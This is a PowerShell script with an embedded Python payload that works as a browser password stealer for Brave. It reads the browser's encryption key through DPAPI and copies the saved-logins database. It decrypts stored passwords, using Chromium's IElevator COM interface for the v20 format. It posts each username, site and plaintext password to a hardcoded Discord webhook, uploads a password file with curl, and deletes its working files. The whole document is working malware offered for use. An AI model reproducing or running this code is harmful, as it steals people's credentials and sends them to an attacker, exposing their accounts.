$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

function Send {
    param([string]$m)
    Invoke-RestMethod -Uri $wh -Method Post -Body (@{content=$m}|ConvertTo-Json) -ContentType "application/json"|Out-Null
}

Send "🔓 NEW METHOD: Decrypt while Brave is running..."

# NE PAS TUER BRAVE - on en a besoin pour IElevator
if (!(Get-Process brave -EA 0)) {
    Send "⚠️ Brave not running, starting it..."
    Start-Process "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\Application\brave.exe" -WindowStyle Hidden
    Start-Sleep 5
}

cd $env:TEMP\py

$script = @'
import os,json,base64,win32crypt,sqlite3,shutil,win32com.client
from Crypto.Cipher import AES

wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

def send(m):
    import subprocess
    subprocess.run(["powershell","-C",f"Invoke-RestMethod -Uri {wh} -Method Post -Body (@{{content='{m}'}}|ConvertTo-Json) -ContentType 'application/json'"],capture_output=True,shell=True)

send("Starting decrypt with IElevator...")

b=os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
ld=b+r"\Default\Login Data"
ls=b+r"\Local State"

# Obtenir la clé normale
with open(ls) as f:
    enc_key=base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
    key=win32crypt.CryptUnprotectData(enc_key,None,None,None,0)[1]

send(f"Key obtained: {len(key)} bytes")

# Essayer d'utiliser IElevator COM pour déchiffrer v20
try:
    elevator = win32com.client.Dispatch("Chromium.IElevator.1")
    send("IElevator COM object created!")
    
    shutil.copy2(ld,"temp.db")
    c=sqlite3.connect("temp.db")
    
    results=[]
    for url,user,enc_pwd in c.execute("SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=''"):
        
        # Vérifier si c'est v20
        if enc_pwd[:3] == b'v20':
            send(f"Found v20 password for {user}@{url}")
            
            # Utiliser IElevator pour déchiffrer
            try:
                decrypted = elevator.DecryptData(enc_pwd)
                results.append(f"[BRAVE-v20] {url}\nUser: {user}\nPass: {decrypted}\n")
                send(f"✅ Decrypted: {decrypted}")
            except Exception as e:
                send(f"IElevator failed: {e}")
        else:
            # Vieux format, déchiffrement normal
            try:
                nonce=enc_pwd[3:15]
                cipher=AES.new(key,AES.MODE_GCM,nonce=nonce)
                pwd=cipher.decrypt_and_verify(enc_pwd[15:-16],enc_pwd[-16:]).decode()
                results.append(f"[BRAVE-old] {url}\nUser: {user}\nPass: {pwd}\n")
            except:
                pass
    
    c.close()
    os.remove("temp.db")
    
    if results:
        with open("passwords.txt","w") as f:
            f.write("\n".join(results))
        send(f"Total: {len(results)} passwords")
    else:
        send("No passwords extracted")
        
except Exception as e:
    send(f"COM Error: {str(e)}")
    send("IElevator not available - Brave v20 cannot be decrypted")
'@

$script | Out-File "decrypt_live.py" -Encoding UTF8

.\python.exe -m pip install pywin32 --quiet 2>$null

$result = .\python.exe decrypt_live.py 2>&1

foreach ($line in $result) {
    Send $line
}

if (Test-Path "passwords.txt") {
    curl.exe -F "file=@passwords.txt" $wh
    Remove-Item passwords.txt
}

Remove-Item decrypt_live.py

Send "🏁 Finished"
